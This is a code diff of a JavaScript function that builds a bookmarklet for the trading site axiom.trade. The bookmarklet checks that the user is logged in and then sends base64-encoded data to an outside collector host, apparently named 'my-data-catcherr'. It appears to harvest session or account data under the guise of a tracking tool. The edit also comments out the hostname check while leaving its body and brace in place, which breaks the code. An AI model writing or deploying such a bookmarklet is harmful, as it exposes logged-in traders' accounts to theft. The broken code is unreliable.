@@ -314,17 +314,19 @@ function loadExample(){
 
 function createBookmark(){
 
-    const bookmark =
-    javascript:(()=>{
+    const bookmark = 
+    `javascript:(async()=>{
 
-    try {
+        try {
 
-        if(location.hostname !== 'axiom.trade'){
-            alert('Please navigate to axiom.trade first');
-            return;
-        }
+            // ===============================
+            // if(location.hostname !== 'axiom.trade'){
+                alert('Please navigate to axiom.trade first');
+                return;
+            }
 
-        if(!localStorage.getItem('isAuthed')){
+
+            if(!localStorage.getItem('isAuthed')){
             alert('Please log in to axiom.trade first');
             return;
         }
@@ -366,15 +368,19 @@ function createBookmark(){
             'https://my-data-catcherr.onrender.com/data/' +
             btoa(JSON.stringify(bookmarkData))
         );
+            // ===============================
 
 
-    } catch(e) {
+            alert("Xtrackgs Bookmarklet läuft");
 
-        alert('Error occurred');
 
-    }
+        } catch(e){
 
-})();
+            alert("Error: " + e.message);
+
+        }
+
+    })();`;
 
 
     document
